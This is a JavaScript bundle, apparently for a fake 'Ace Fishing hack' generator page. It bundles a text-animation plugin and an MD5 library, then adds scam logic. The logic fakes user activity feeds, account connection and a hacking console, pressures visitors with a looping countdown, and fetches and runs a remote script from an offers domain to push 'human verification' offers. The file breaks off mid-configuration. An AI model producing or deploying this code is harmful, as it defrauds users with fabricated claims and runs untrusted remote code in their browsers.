(function( $ ){

	var plugin_name = "dynatexer";   // Name of the plugin

	function nl2br (str, is_xhtml) {
		var breakTag = (is_xhtml || typeof is_xhtml === 'undefined') ? '<br />' : '<br>';
		return (str + '').replace(/([^>\r\n]?)(\r\n|\n\r|\r|\n)/g, '$1'+ breakTag);
	}

	function create_placeholder(content, data) {
		if (!content.placeholder_tag) {
			if (!content.placeholder || content.placeholder == '') {
				content.placeholder_tag = target;
			} else {
				placeholder_tag = $(content.placeholder);
				if (data.cursor && data.cursor.placeholder_tag) {
					content.placeholder_tag = placeholder_tag;
					content.placeholder_tag.insertBefore(data.cursor.placeholder_tag);
				} else {
					content.placeholder_tag = placeholder_tag;
					data.target.append(content.placeholder_tag);
				}
			}
		}
	}

	function assign_iterator(content) {
		if (!content.current_iterator) {
			content.current_iterator = render_strategies[content.render_strategy](content.items);
		}
	}

	function char_iterator(text) {
		this.current_char = 0;
		this.text = text;
	}

	char_iterator.prototype.has_next = function() {
		return this.current_char < this.text.length;
	}

	char_iterator.prototype.next = function() {
		var char = this.text.charAt(this.current_char++);
		if (char == '\r') {
			char = content.text.charAt(this.current_item++);
			if (char == '\n') {
				char = content.text.charAt(this.current_item++);
			}
			char = '<br />';
		} else if (char == '\n') {
			char = '<br />';
		}
		return char;
	}

	function one_shot_iterator(text) {
		this.listed = false;
		this.text = text;
	}

	one_shot_iterator.prototype.has_next = function() {
		return !this.listed;
	}

	one_shot_iterator.prototype.next = function() {
		this.listed = true;
		return nl2br(this.text);
	}

	function array_iterator(items) {
		this.current_item = 0;
		this.items = items;
	}

	array_iterator.prototype.has_next = function() {
		return this.current_item < this.items.length;
	}

	array_iterator.prototype.next = function() {
		return this.items[this.current_item++];
	}

	function line_iterator(text) {
		var lines = text.split(/\r\n|\r|\n/);
		this.delegate = new array_iterator(lines);
	}

	line_iterator.prototype.has_next = function() {
		return this.delegate.has_next();
	}

	line_iterator.prototype.next = function() {
		return (this.delegate.current_item != 0 ? '<br />' : '') + this.delegate.next();
	}

	function animate_content(data, content, finish_callback, strategy) {
		strategy.prepare();

		finish_callback = (typeof finish_callback === "undefined") ? function() {} : finish_callback;
		assign_iterator(content);

		content.current_iterator.has_next() ? animated = true : animated = false;

		var secuence = function() {
			if (data.running) {
				if (content.current_iterator.has_next()) {
					strategy.render();
					setTimeout(function() {
						if (data.running) {
							secuence();
						}
					}, content.delay);
				} else {
					finish_callback();
				}
			}
		}
		setTimeout(function() {
			secuence();
		}, 1);
		return animated;
	}

	var animations = {
		additive: function(data, content, finish_callback) {
			return animate_content(data, content, finish_callback, {
				prepare: function() {
					create_placeholder(content, data);
				},
				render: function() {
					content.placeholder_tag.html(content.placeholder_tag.html() + content.current_iterator.next());
				}
			});
		},
		replace: function(data, content, finish_callback) {
			return animate_content(data, content, finish_callback, {
				prepare: function() {
					// placeholder is necessary
					if (!content.placeholder || content.placeholder == '') content.placeholder = '<span>';
					create_placeholder(content, data);
				},
				render: function() {
					content.placeholder_tag.html(content.current_iterator.next());
				}
			});
		}
	}

	var render_strategies = {
		'text-by-char': function(items) {
			return new char_iterator(items.toString());
		},
		'text-by-line': function(items) {
			return new line_iterator(items.toString());
		},
		'text-one-shot': function(items) {
			return new one_shot_iterator(items.toString());
		},
		iterator: function(items) {
			return items.iterator();
		},
		'array-items': function(items) {
			return new array_iterator(items);
		}
	}

	function clean(data) {
		$.each(data.content, function(i, val) {
			val.current_iterator = null;
			val.placeholder_tag = null;
		});
		data.current_content = 0;
		if (data.cursor) {
			data.target.children().not(data.cursor.placeholder_tag).remove();
		} else {
			data.target.children().remove();
		}
	}

	function reset_cursor(data) {
		if (data.cursor) {
			data.cursor.current_iterator = null;
			if (data.cursor.placeholder_tag) {
				data.cursor.placeholder_tag.children().remove();
				data.cursor.placeholder_tag.text('');
			}
		}
	}

	function set_defaults(config) {
		config = $.extend({}, $.fn[plugin_name].defaults.general, config);
		content = [];
		$.each(config.content, function(i, val) {
			content.push($.extend({}, $.fn[plugin_name].defaults.content, val));
		});
		config.content = content;
		if (typeof (config.cursor) != 'undefined') {
			config.cursor = $.extend({}, $.fn[plugin_name].defaults.cursor, config.cursor)
		}
		return config;
	}

	function init($this, config) {
		config = set_defaults(config);

		var data = $this.data(plugin_name);

		if ( ! data ) {
			$this.data(plugin_name, {
				target: $this
			});
		}
		data = $this.data(plugin_name);

		data.loop = config.loop;
		data.content = config.content;
		data.current_content = 0;
		data.times = 0;
		data.running = false;
		data.cursor = config.cursor;

		if (typeof(data.cursor) != "undefined") {
			if (typeof(data.cursor.placeholder) == "undefined" || data.cursor.placeholder == '') {
				data.cursor.placeholder = '<span>';
			}
			data.cursor.times = 0;
		}
	}

	var methods = {
		init : function( config ) {
			return this.each(function() {
				init($(this), config);
			});
		},
		play : function (finish_callback) {
			finish_callback = (typeof finish_callback === "undefined") ? function() {} : finish_callback;
			return this.each(function() {
				var $this = $(this), data = $this.data(plugin_name);

				if (data.running) return;

				data.running = true;

				var secuence = function() {
					if (data.running) {
						if (data.current_content < data.content.length) {
							content = data.content[data.current_content];
							animations[content.animation](
								data,
								content,
								function() {
									++data.current_content;
									secuence();
								}
							);
						} else {
							// a loop finished

							if (data.loop == 'infinite' || data.loop < 1) {
								clean(data);
								secuence();
							} else {
								++data.times;
								if (data.times < data.loop) {
									clean(data);
									secuence();
								} else {
									data.running = false;
									finish_callback();
								}
							}
						}
					}
				}
				secuence();

				var cursor = function() {
					if (data.running && data.cursor) {
						animations[data.cursor.animation](
							data,
							data.cursor,
							function() {
								if (data.cursor.loop == 'infinite' || data.cursor.loop < 1) {
									reset_cursor(data);
									cursor();
								} else {
									++data.cursor.times;
									if (data.cursor.times < data.cursor.loop) {
										reset_cursor(data);
										cursor();
									}
								}
							}
						);
					}
				}
				cursor();
			});
		},
		pause : function( ) {
			return this.each(function() {
				var $this = $(this), data = $this.data(plugin_name);

				data.running = false;
			});
		},
		reset : function( ) {
			return this.each(function() {
				var $this = $(this), data = $this.data(plugin_name);

				data.running = false;

				data.times = 0;
				if (typeof(data.cursor) != "undefined") {
					data.cursor.times = 0;
				}
				clean(data);
				reset_cursor(data);
			});
		},
		configure : function( config ) {
			return this.each(function() {
				var $this = $(this), data = $this.data(plugin_name);
				clean(data);
				data.target.children().remove();
				init($this, config);
			});
		}
	};

	$.fn[plugin_name] = function( method ) {

		// Method calling logic
		if ( methods[method] ) {
			return methods[ method ].apply( this, Array.prototype.slice.call( arguments, 1 ));
		} else if ( typeof method === 'object' || ! method ) {
			return methods.init.apply( this, arguments );
		} else {
			$.error( 'Method ' + method + ' does not exist on jQuery.' + plugin_name);
		}

	};

	$.fn[plugin_name].defaults = {
		general: {
			loop: 1,
			content: []
		},
		content: {
			animation: 'additive',
			delay: 0,
			placeholder: '<span>',
			render_strategy: 'text-one-shot',
			items: ''
		},
		cursor: {
			loop: 'infinite',
			animation: 'replace',
			delay: 500,
			placeholder: '<span>',
			render_strategy: 'array-items',
			items: []
		}
	}

	$.fn[plugin_name].helper = {
		counter: function(config) {
			return {
				iterator: function() {
					var it = {
						config: $.extend({
							start: 1,
							end: 100,
							step: 1,
							mask: '%d'
						}, config),
						has_next: function() {
							return this.index <= this.config.end;
						},
						next: function() {
							var temp = this.index;
							this.index += Math.max(1, Math.min(this.config.step, Math.abs(this.config.end - this.index)));
							return this.config.mask.replace('%d', temp);
						}
					};
					it.index = it.config.start;
					return it;
				}
			}
		}
	}
})( jQuery );

/**
 * [js-md5]{@link https://github.com/emn178/js-md5}
 *
 * @namespace md5
 * @version 0.4.0
 * @author Chen, Yi-Cyuan [emn178@gmail.com]
 * @copyright Chen, Yi-Cyuan 2014-2016
 * @license MIT
 */
!function(t){"use strict";function r(t){if(t)c[0]=c[16]=c[1]=c[2]=c[3]=c[4]=c[5]=c[6]=c[7]=c[8]=c[9]=c[10]=c[11]=c[12]=c[13]=c[14]=c[15]=0,this.blocks=c,this.buffer8=i;else if(n){var r=new ArrayBuffer(68);this.buffer8=new Uint8Array(r),this.blocks=new Uint32Array(r)}else this.blocks=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];this.h0=this.h1=this.h2=this.h3=this.start=this.bytes=0,this.finalized=this.hashed=!1,this.first=!0}var e="object"==typeof process&&process.versions&&process.versions.node;e&&(t=global);var i,h=!t.JS_MD5_TEST&&"object"==typeof module&&module.exports,s="function"==typeof define&&define.amd,n=!t.JS_MD5_TEST&&"undefined"!=typeof ArrayBuffer,f="0123456789abcdef".split(""),a=[128,32768,8388608,-2147483648],o=[0,8,16,24],u=["hex","array","digest","buffer","arrayBuffer"],c=[];if(n){var p=new ArrayBuffer(68);i=new Uint8Array(p),c=new Uint32Array(p)}var y=function(t){return function(e){return new r(!0).update(e)[t]()}},d=function(){var t=y("hex");e&&(t=l(t)),t.create=function(){return new r},t.update=function(r){return t.create().update(r)};for(var i=0;i<u.length;++i){var h=u[i];t[h]=y(h)}return t},l=function(r){var e,i;try{if(t.JS_MD5_TEST)throw"JS_MD5_TEST";e=require("crypto"),i=require("buffer").Buffer}catch(h){return console.log(h),r}var s=function(t){if("string"==typeof t)return e.createHash("md5").update(t,"utf8").digest("hex");if(t.constructor==ArrayBuffer)t=new Uint8Array(t);else if(void 0===t.length)return r(t);return e.createHash("md5").update(new i(t)).digest("hex")};return s};r.prototype.update=function(r){if(!this.finalized){var e="string"!=typeof r;e&&r.constructor==t.ArrayBuffer&&(r=new Uint8Array(r));for(var i,h,s=0,f=r.length||0,a=this.blocks,u=this.buffer8;f>s;){if(this.hashed&&(this.hashed=!1,a[0]=a[16],a[16]=a[1]=a[2]=a[3]=a[4]=a[5]=a[6]=a[7]=a[8]=a[9]=a[10]=a[11]=a[12]=a[13]=a[14]=a[15]=0),e)if(n)for(h=this.start;f>s&&64>h;++s)u[h++]=r[s];else for(h=this.start;f>s&&64>h;++s)a[h>>2]|=r[s]<<o[3&h++];else if(n)for(h=this.start;f>s&&64>h;++s)i=r.charCodeAt(s),128>i?u[h++]=i:2048>i?(u[h++]=192|i>>6,u[h++]=128|63&i):55296>i||i>=57344?(u[h++]=224|i>>12,u[h++]=128|i>>6&63,u[h++]=128|63&i):(i=65536+((1023&i)<<10|1023&r.charCodeAt(++s)),u[h++]=240|i>>18,u[h++]=128|i>>12&63,u[h++]=128|i>>6&63,u[h++]=128|63&i);else for(h=this.start;f>s&&64>h;++s)i=r.charCodeAt(s),128>i?a[h>>2]|=i<<o[3&h++]:2048>i?(a[h>>2]|=(192|i>>6)<<o[3&h++],a[h>>2]|=(128|63&i)<<o[3&h++]):55296>i||i>=57344?(a[h>>2]|=(224|i>>12)<<o[3&h++],a[h>>2]|=(128|i>>6&63)<<o[3&h++],a[h>>2]|=(128|63&i)<<o[3&h++]):(i=65536+((1023&i)<<10|1023&r.charCodeAt(++s)),a[h>>2]|=(240|i>>18)<<o[3&h++],a[h>>2]|=(128|i>>12&63)<<o[3&h++],a[h>>2]|=(128|i>>6&63)<<o[3&h++],a[h>>2]|=(128|63&i)<<o[3&h++]);this.lastByteIndex=h,this.bytes+=h-this.start,h>=64?(this.start=h-64,this.hash(),this.hashed=!0):this.start=h}return this}},r.prototype.finalize=function(){if(!this.finalized){this.finalized=!0;var t=this.blocks,r=this.lastByteIndex;t[r>>2]|=a[3&r],r>=56&&(this.hashed||this.hash(),t[0]=t[16],t[16]=t[1]=t[2]=t[3]=t[4]=t[5]=t[6]=t[7]=t[8]=t[9]=t[10]=t[11]=t[12]=t[13]=t[14]=t[15]=0),t[14]=this.bytes<<3,this.hash()}},r.prototype.hash=function(){var t,r,e,i,h,s,n=this.blocks;this.first?(t=n[0]-680876937,t=(t<<7|t>>>25)-271733879<<0,i=(-1732584194^2004318071&t)+n[1]-117830708,i=(i<<12|i>>>20)+t<<0,e=(-271733879^i&(-271733879^t))+n[2]-1126478375,e=(e<<17|e>>>15)+i<<0,r=(t^e&(i^t))+n[3]-1316259209,r=(r<<22|r>>>10)+e<<0):(t=this.h0,r=this.h1,e=this.h2,i=this.h3,t+=(i^r&(e^i))+n[0]-680876936,t=(t<<7|t>>>25)+r<<0,i+=(e^t&(r^e))+n[1]-389564586,i=(i<<12|i>>>20)+t<<0,e+=(r^i&(t^r))+n[2]+606105819,e=(e<<17|e>>>15)+i<<0,r+=(t^e&(i^t))+n[3]-1044525330,r=(r<<22|r>>>10)+e<<0),t+=(i^r&(e^i))+n[4]-176418897,t=(t<<7|t>>>25)+r<<0,i+=(e^t&(r^e))+n[5]+1200080426,i=(i<<12|i>>>20)+t<<0,e+=(r^i&(t^r))+n[6]-1473231341,e=(e<<17|e>>>15)+i<<0,r+=(t^e&(i^t))+n[7]-45705983,r=(r<<22|r>>>10)+e<<0,t+=(i^r&(e^i))+n[8]+1770035416,t=(t<<7|t>>>25)+r<<0,i+=(e^t&(r^e))+n[9]-1958414417,i=(i<<12|i>>>20)+t<<0,e+=(r^i&(t^r))+n[10]-42063,e=(e<<17|e>>>15)+i<<0,r+=(t^e&(i^t))+n[11]-1990404162,r=(r<<22|r>>>10)+e<<0,t+=(i^r&(e^i))+n[12]+1804603682,t=(t<<7|t>>>25)+r<<0,i+=(e^t&(r^e))+n[13]-40341101,i=(i<<12|i>>>20)+t<<0,e+=(r^i&(t^r))+n[14]-1502002290,e=(e<<17|e>>>15)+i<<0,r+=(t^e&(i^t))+n[15]+1236535329,r=(r<<22|r>>>10)+e<<0,t+=(e^i&(r^e))+n[1]-165796510,t=(t<<5|t>>>27)+r<<0,i+=(r^e&(t^r))+n[6]-1069501632,i=(i<<9|i>>>23)+t<<0,e+=(t^r&(i^t))+n[11]+643717713,e=(e<<14|e>>>18)+i<<0,r+=(i^t&(e^i))+n[0]-373897302,r=(r<<20|r>>>12)+e<<0,t+=(e^i&(r^e))+n[5]-701558691,t=(t<<5|t>>>27)+r<<0,i+=(r^e&(t^r))+n[10]+38016083,i=(i<<9|i>>>23)+t<<0,e+=(t^r&(i^t))+n[15]-660478335,e=(e<<14|e>>>18)+i<<0,r+=(i^t&(e^i))+n[4]-405537848,r=(r<<20|r>>>12)+e<<0,t+=(e^i&(r^e))+n[9]+568446438,t=(t<<5|t>>>27)+r<<0,i+=(r^e&(t^r))+n[14]-1019803690,i=(i<<9|i>>>23)+t<<0,e+=(t^r&(i^t))+n[3]-187363961,e=(e<<14|e>>>18)+i<<0,r+=(i^t&(e^i))+n[8]+1163531501,r=(r<<20|r>>>12)+e<<0,t+=(e^i&(r^e))+n[13]-1444681467,t=(t<<5|t>>>27)+r<<0,i+=(r^e&(t^r))+n[2]-51403784,i=(i<<9|i>>>23)+t<<0,e+=(t^r&(i^t))+n[7]+1735328473,e=(e<<14|e>>>18)+i<<0,r+=(i^t&(e^i))+n[12]-1926607734,r=(r<<20|r>>>12)+e<<0,h=r^e,t+=(h^i)+n[5]-378558,t=(t<<4|t>>>28)+r<<0,i+=(h^t)+n[8]-2022574463,i=(i<<11|i>>>21)+t<<0,s=i^t,e+=(s^r)+n[11]+1839030562,e=(e<<16|e>>>16)+i<<0,r+=(s^e)+n[14]-35309556,r=(r<<23|r>>>9)+e<<0,h=r^e,t+=(h^i)+n[1]-1530992060,t=(t<<4|t>>>28)+r<<0,i+=(h^t)+n[4]+1272893353,i=(i<<11|i>>>21)+t<<0,s=i^t,e+=(s^r)+n[7]-155497632,e=(e<<16|e>>>16)+i<<0,r+=(s^e)+n[10]-1094730640,r=(r<<23|r>>>9)+e<<0,h=r^e,t+=(h^i)+n[13]+681279174,t=(t<<4|t>>>28)+r<<0,i+=(h^t)+n[0]-358537222,i=(i<<11|i>>>21)+t<<0,s=i^t,e+=(s^r)+n[3]-722521979,e=(e<<16|e>>>16)+i<<0,r+=(s^e)+n[6]+76029189,r=(r<<23|r>>>9)+e<<0,h=r^e,t+=(h^i)+n[9]-640364487,t=(t<<4|t>>>28)+r<<0,i+=(h^t)+n[12]-421815835,i=(i<<11|i>>>21)+t<<0,s=i^t,e+=(s^r)+n[15]+530742520,e=(e<<16|e>>>16)+i<<0,r+=(s^e)+n[2]-995338651,r=(r<<23|r>>>9)+e<<0,t+=(e^(r|~i))+n[0]-198630844,t=(t<<6|t>>>26)+r<<0,i+=(r^(t|~e))+n[7]+1126891415,i=(i<<10|i>>>22)+t<<0,e+=(t^(i|~r))+n[14]-1416354905,e=(e<<15|e>>>17)+i<<0,r+=(i^(e|~t))+n[5]-57434055,r=(r<<21|r>>>11)+e<<0,t+=(e^(r|~i))+n[12]+1700485571,t=(t<<6|t>>>26)+r<<0,i+=(r^(t|~e))+n[3]-1894986606,i=(i<<10|i>>>22)+t<<0,e+=(t^(i|~r))+n[10]-1051523,e=(e<<15|e>>>17)+i<<0,r+=(i^(e|~t))+n[1]-2054922799,r=(r<<21|r>>>11)+e<<0,t+=(e^(r|~i))+n[8]+1873313359,t=(t<<6|t>>>26)+r<<0,i+=(r^(t|~e))+n[15]-30611744,i=(i<<10|i>>>22)+t<<0,e+=(t^(i|~r))+n[6]-1560198380,e=(e<<15|e>>>17)+i<<0,r+=(i^(e|~t))+n[13]+1309151649,r=(r<<21|r>>>11)+e<<0,t+=(e^(r|~i))+n[4]-145523070,t=(t<<6|t>>>26)+r<<0,i+=(r^(t|~e))+n[11]-1120210379,i=(i<<10|i>>>22)+t<<0,e+=(t^(i|~r))+n[2]+718787259,e=(e<<15|e>>>17)+i<<0,r+=(i^(e|~t))+n[9]-343485551,r=(r<<21|r>>>11)+e<<0,this.first?(this.h0=t+1732584193<<0,this.h1=r-271733879<<0,this.h2=e-1732584194<<0,this.h3=i+271733878<<0,this.first=!1):(this.h0=this.h0+t<<0,this.h1=this.h1+r<<0,this.h2=this.h2+e<<0,this.h3=this.h3+i<<0)},r.prototype.hex=function(){this.finalize();var t=this.h0,r=this.h1,e=this.h2,i=this.h3;return f[t>>4&15]+f[15&t]+f[t>>12&15]+f[t>>8&15]+f[t>>20&15]+f[t>>16&15]+f[t>>28&15]+f[t>>24&15]+f[r>>4&15]+f[15&r]+f[r>>12&15]+f[r>>8&15]+f[r>>20&15]+f[r>>16&15]+f[r>>28&15]+f[r>>24&15]+f[e>>4&15]+f[15&e]+f[e>>12&15]+f[e>>8&15]+f[e>>20&15]+f[e>>16&15]+f[e>>28&15]+f[e>>24&15]+f[i>>4&15]+f[15&i]+f[i>>12&15]+f[i>>8&15]+f[i>>20&15]+f[i>>16&15]+f[i>>28&15]+f[i>>24&15]},r.prototype.toString=r.prototype.hex,r.prototype.digest=function(){this.finalize();var t=this.h0,r=this.h1,e=this.h2,i=this.h3;return[255&t,t>>8&255,t>>16&255,t>>24&255,255&r,r>>8&255,r>>16&255,r>>24&255,255&e,e>>8&255,e>>16&255,e>>24&255,255&i,i>>8&255,i>>16&255,i>>24&255]},r.prototype.array=r.prototype.digest,r.prototype.arrayBuffer=function(){this.finalize();var t=new ArrayBuffer(16),r=new Uint32Array(t);return r[0]=this.h0,r[1]=this.h1,r[2]=this.h2,r[3]=this.h3,t},r.prototype.buffer=r.prototype.arrayBuffer;var v=d();h?module.exports=v:(t.md5=v,s&&define(function(){return v}))}(this);

$(document).ready(function(){

	$('.last-updated-msg').addClass('custom-color');
	$('.btn-success').addClass('custom-color-border');

    if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {

	} else {
		$.backstretch("img/background.jpg");
	}

    Date.prototype.yyyymmdd = function() {
		var yyyy = this.getFullYear().toString();
		var mm = (this.getMonth()+1).toString(); // getMonth() is zero-based
		var dd  = this.getDate().toString();
		return yyyy + "/" + (mm[1]?mm:"0"+mm[0]) + "/" + (dd[1]?dd:"0"+dd[0]); // padding
	};

	var date = new Date();
    $('#date-updated').text(date.yyyymmdd());

    var proxy_switch = new Switchery($('.js-switch')[0]);
    var share_website_link = "https://terrangaming.com/ace-fishing-hack-new-ace-fishing-cheats/";
    var twitter_tweet_msg = "Check out the latest Ace Fishing hack at https://terrangaming.com/ace-fishing-hack-new-ace-fishing-cheats/";

    var feed_key = 'SKRYR6RCNYJFptmc';
    var game_name = "Ace Fishing";

    var account_connected = false;
    var gen_items_array = [];

    // Generator items
    // $('.gen-item').each(function(){
    //     $(this).attr('disabled', 'disabled');
    // });

    setGameItems();

    $('.gen-item').each(function(){
        var $el = $(this);
        $el.parent().find('.gen-item-icon').html('<img src="' + $el.data('img') + '" width="20px" height="20px"/>');
    });

    // Updates
    function randomUpdateMessage() {
        var name = chance.ip();
        // var countryCode = chance.country().toLowerCase();
        var countryCode = chance.pickone([
            'at',
            'be',
            'de',
            'ro',
            'ch',
            'fr',
            'gb',
            'ie',
            'is',
            'it',
            'jp',
            'sg',
            'sw',
            'sa',
            'sp',
            'my',
            'nl',
            'pl',
            'pr',
            'us'
        ]);
        var number1 = ["500,000","1,000,000","2,500,000","5,000,000","10,000,000"];
		var number2 = ["250,000","500,000","1,000,000","5,000,000"];
        var randomResource = chance.pickone(gen_items_array);
        var newMsg = '<img src="img/countries/' + countryCode +'.png" /> ' + name + ' has generated <br> <img src="./img/warbucks.png" width="24px" height="24px"/> ' + number1[Math.floor(Math.random() * number1.length)] + ' Warbucks and ' + '<img src="./img/gold.png" width="24px" height="24px"/> ' + number2[Math.floor(Math.random() * number2.length)] + ' Gold. ';
        $('.updates-box p.msg').fadeOut().html(newMsg).fadeIn();
    }

    $('.connect-btn').on('click', function() {
        if(!account_connected) {
            var username = $('#username').val();
            if(username != '') {
                connectAccountDialog(username, $(this));
            }
        } else {
            swal('Error', 'Your account is already connected.', 'error');
        }
    });

    function connectAccountDialog(username, connectBtn) {
        setTimeout(function() {
            account_connected = {
                username: username,
                connected: true
            }
            connectBtn.attr('disabled', 'disabled');
            $('#username').attr('disabled', 'disabled');
            bootbox.hideAll();
            enableAllGenItems();
            swal('Success', 'Account has been connected.', 'success');
        }, getRandomInt(1200, 1800));
        bootbox.dialog({
            title: 'Connecting',
            message: '<div class="loading-spinner"></div>' +
                     '<p>Please wait while we connect to your account...</p>',
            closeButton: false,
            static: true
        });
    }

    function enableAllGenItems() {
        $('.gen-item').each(function(){
            $(this).removeAttr('disabled');
        });
    }

    function setGameItems() {
        gen_items_array = _.map($('.gen-item'), function(el) {
            return [$(el).data('name'), $(el).data('img'), $(el).val()];
        });

		randomUpdateMessage();

	    var updatesInterval = setInterval(function() {
	        randomUpdateMessage();
	    }, 6000);
    }

    $('#gen-btn').on('click', function(){
        var username = $('#username').val();
        var proxy = $('.js-switch').val();
        var platform = $('#platform').val();

        setGameItems();

        // if(!account_connected) {
        //     swal('Error', 'Please connect your account.', 'error');
        //     return false;
        // }

        if(platform) {
            // if(username != '') {
                confirmDialog(username, platform);
            // } else {
            //     swal('Error', 'Please enter your Origin email.', 'error');
            // }
        } else {
            swal('Error', 'Please select your platform.', 'error');
        }
    });

    function confirmDialog(username, platform) {
        var items_confirm = '';
        for(var i = 0; i < gen_items_array.length; i++) {
            items_confirm += '<p><img src="' + gen_items_array[i][1] + '" width="15px" height="15px"/> ' + gen_items_array[i][0] + ': <strong>' + gen_items_array[i][2] + '</strong></p>';
        }
        bootbox.dialog({
            title: 'Confirmation',
            message: '<p>Please confirm your request:</p>' +
                     '<p>Warfriends Username: <strong>' + username + '</strong></p>' +
                     '<p>Platform: <strong>' + platform + '</strong></p>' + items_confirm,
            buttons: {
                cancel: {
                    label: 'Cancel',
                    className: 'btn-default',
                    callback: function() {
                        bootbox.hideAll();
                    }
                },
                start: {
                    label: 'Confirm!',
                    className: 'btn-success custom-color-border',
                    callback: function() {
                        bootbox.hideAll();
                        openGeneratorModal(username);
                    }
                }
            }
        });
    }


    function openShareWindow(username) {
    	var shareWindow = bootbox.dialog({
            title: 'Show your support!',
            message: '<p>Please support us by sharing the generator with your friends.</p>' +
                     '<p><a href="http://hrefshare.com/d56c2" target="_blank" class="btn btn-primary btn-block custom-color-border"><i class="fa fa-twitter"></i> Share on Twitter</a></p>' +
                     '<p><a href="https://www.facebook.com/freefifacoinsnet/" target="_blank" class="btn btn-primary btn-block custom-color-border"><i class="fa fa-facebook"></i> Share on Facebook</a></p>',
            closeButton: true,
            buttons: {
                cancel: {
                    label: 'Continue',
                    className: 'btn-default',
                    callback: function() {
                        // shareWindow.moda('hide');
                        // openGetCodeDialog();
                        bootbox.hideAll();
                        openGeneratorModal(username);
                    }
                }
            }
        });
    }

    function htmlEntities(str) {
        return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    }

    var $console_text_area, $console_text_list, $console_text_area_height;

    function openGeneratorModal(username) {
        bootbox.dialog({
            title: 'Generating',
            message: '<div class="loading-spinner"></div>' +
                     '<h3 class="gen-loading-msg">Processing your request</h3>' +
                     '<div id="generator-console"></div>'
        });
        startConsoleAnimation(function(){
            bootbox.hideAll();
            openGetCodeDialog();
            // bootbox.dialog({
            //     title: '<i class="glyphicon glyphicon-user"></i> Human Verification',
            //     message: '<p>Before we can add the <span class="offers-blue-text">selected items</span> to your account we need to <span class="offers-blue-text">VERIFY</span> that you are a human and not an automated bot. This security check exists in order to prevent the wide abuse of our generator.</p><p><input type="text" class="form-control" placeholder="Enter verification code..." /></p><p>If you do not have one, you can obtain a verification code by clicking on the <span class="offers-blue-text">get code</span> button below.</p>',
            //     closeButton: false,
            //     buttons: {
            //         submit: {
            //             label: 'Submit',
            //             className: 'btn-primary',
            //             callback: function() {
            //                 sweetAlert("Error", "Invalid verification code. Please try again.", "error");
            //                 return false;
            //             }
            //         },
            //         getCode: {
            //             label: 'Get Code',
            //             className: 'btn-success',
            //             callback: function() {
            //                 // Content Locker
            //                 // call_locker();

            //                 // Link locker
            //                 // OpenInNewTab("http://google.com")
            //                 openGetCodeDialog();
            //                 return false;
            //             }
            //         }
            //     }
            // });
        });
    }

                function openGetCodeDialog() {
      bootbox.hideAll();
      var items = '';
        for(var i = 0; i < gen_items_array.length; i++) {
            items += '<div class="item"><div class="left custom-border"><img src="' + gen_items_array[i][1] + '"/></div><div class="right custom-border">' + gen_items_array[i][2] + '</div></div>';
        }
        var code_modal = bootbox.dialog({
            title: '<i class="glyphicon glyphicon-user"></i> Human Verification',
            message:
                 '<p id="timer-countdown">Items available for another <strong class="mins">14</strong> mins and <strong class="seconds">59</strong> seconds.<p>' +
                 '<div class="pending-items-box custom-color">' +
                 '<p class="text">Pending Items:<p>' +
                 items +
                 '</div>' +
                     '<ol class="steps-list">' +
                        '<li>Click on the "BEGIN VERIFCATION" button.</li>' +
                        '<li>Take a few minutes to complete a short offer.</li>' +
                        '<li>After completing the offer, the coins and points will be added to your club.</li>' +
                     '</ol>' +
                     '<style>' +
                     ".btn-custom{color:#fff;background-color:#0B1A2D;border-color:#0B1A2D}.btn-custom.active,.btn-custom:active,.btn-custom:focus,.btn-custom:hover,.open .dropdown-toggle.btn-custom{color:#fff;background-color:#13253D;border-color:#0B1A2D}.btn-custom.active,.btn-custom:active,.open .dropdown-toggle.btn-custom{background-image:none}.btn-custom.disabled,.btn-custom.disabled.active,.btn-custom.disabled:active,.btn-custom.disabled:focus,.btn-custom.disabled:hover,.btn-custom[disabled],.btn-custom[disabled].active,.btn-custom[disabled]:active,.btn-custom[disabled]:focus,.btn-custom[disabled]:hover,fieldset[disabled] .btn-custom,fieldset[disabled] .btn-custom.active,fieldset[disabled] .btn-custom:active,fieldset[disabled] .btn-custom:focus,fieldset[disabled] .btn-custom:hover{background-color:#0B1A2D;border-color:#0B1A2D}.btn-custom .badge{color:#0B1A2D;background-color:#fff} .ludy-options a{border:none !important;}" +
                     '</style>' +
                     '<button class="ludy-trigger btn btn-success btn-lg btn-block btn-custom blender-pro-book">BEGIN VERIFICATION<i class="fa fa-chevron-right blue-text-color"></i></button>' +
                     '<div class="offers-wrapper"><div class="ludy-options" offers="vum2Z5rUkVKNEe9F"></div></div>' +
                     '<br><p>Note: Because of the wide abuse of our hack, <strong>human verification</strong> is required to keep it running. Thank you for understanding.</p>',
            closeButton: false,
            buttons: {
                // cancel: {
                //     label: '<i class="fa fa-mail-reply"></i> Back to Code Submission',
                //     className: 'btn-success',
                //     callback: function() {
                //         code_modal.modal('hide');
                //     }
                // },
            }
        });

        // Countdown
        function timerStart() {
			var countdown = 15 * 60 * 1000;
			var timerId = setInterval(function(){
				countdown -= 1000;
				var min = Math.floor(countdown / (60 * 1000));
				var sec = Math.floor((countdown - (min * 60 * 1000)) / 1000);  //correct
				if (countdown <= 0) {
					clearInterval(timerId);
					timerStart();
				} else {
					$("#timer-countdown strong.mins").html(min);
					$("#timer-countdown strong.seconds").html(sec);
				}
			}, 1000);
        }
        timerStart();

        $.ajax({
        	url: 'http://www.lucyfeed.com/vum2Z5rUkVKNEe9F',
        	dataType: 'script',
        	success: function() {
        		$('.offers-wrapper').hide();
        		$('.ludy-trigger').on('click', function () {
							$(this).slideUp(300, function () {
								$('.offers-wrapper').slideDown(300);
							});
						});
        	}
        });

                        // REMOVE COMMENTS HERE AND COMMENT THE ABOVE STUFF TO USE NEW TAB OFFERS INSTEAD
		// $('.ludy-trigger').on('click', function () {
		// 	// OpenInNewTab('https://www.humanverify.net/cl.php?id=3dbfa9af5945bee15efb56c44fafc4f3');
		// });
    }

    function OpenInNewTab(url) {
        var win = window.open(url, '_blank');
        win.focus();
    }

	function startConsoleAnimation(callback){
        var items = "";
        for(var i = 0; i < gen_items_array.length; i++) {
            items += "-" + gen_items_array[i][0] + "(" + gen_items_array[i][2] + ")";
        }
		/* CONSOLE ANIMATION */
		$('#generator-console').dynatexer({
			loop: 1,
			content: [
				{
					animation: 'additive',
					delay: 0,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-one-shot',
					items: "[root@28.3.4.53.2]$ "
				},
				{
					animation: 'additive',
					delay: 5,
